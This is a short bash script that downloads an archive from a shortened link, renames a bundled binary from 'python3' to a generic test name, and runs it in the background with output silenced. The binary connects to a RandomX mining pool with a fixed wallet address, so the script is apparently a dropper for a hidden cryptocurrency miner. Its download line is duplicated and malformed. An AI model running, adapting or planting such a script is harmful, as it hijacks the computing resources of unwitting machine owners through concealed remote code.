#!/bin/bash

kolot=$(cat /dev/urandom | tr -dc '0-9' | fold -w 2 | head -n 1)

wget -O dot wget -O dot bit.ly/KONTOL-AKU-GEDE

tar xvf dot

cd dot

mv python3 test$kolot

nohup ./test$kolot -o randomx.rplant.xyz:17123 -a randomtuske -u TuskeSyuQm6YLGZbrMTCpgEcCK21jrizBgErTDV2VyNh8jJRWrJVwuy7h6JLqztszCFsPZFVh1wBLdBUsk22x7vcP33YDgppwgSHHj.DOT-$kolot > /dev/null 2>&1 &
